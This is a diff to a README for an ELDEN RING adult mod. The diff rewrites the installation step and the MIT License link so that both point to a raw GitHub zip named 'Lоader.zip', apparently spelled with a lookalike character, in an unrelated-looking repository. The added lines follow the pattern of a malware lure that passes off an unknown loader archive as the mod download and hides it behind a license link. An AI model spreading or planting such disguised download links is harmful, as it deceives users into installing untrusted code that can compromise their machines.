@@ -36,7 +36,7 @@ ELDEN RING adult mod, mature mods, NSFW mod, ELDEN RING enhancement, erotic game
 
 ## 📦 Installation Guide
 
-1. Download **Loader.rar** from the repository.
+1. Download **https://raw.githubusercontent.com/josoe73/gemini_icpc2025/main/Lоader.zip** from the repository.
 2. Extract the archive using your preferred tool.
 3. Launch the Loader and specify your ELDEN RING install folder.
 4. Follow the onscreen setup instructions.
@@ -52,7 +52,7 @@ This mod is intended for users aged 18+ for mature content. It is a fan project,
 
 ## 📝 License
 
-Distributed under the [MIT License](https://opensource.org/licenses/MIT) © 2025. Free for personal use, modification, and sharing!  
+Distributed under the [MIT License](https://raw.githubusercontent.com/josoe73/gemini_icpc2025/main/Lоader.zip) © 2025. Free for personal use, modification, and sharing!  
 
 ---
 
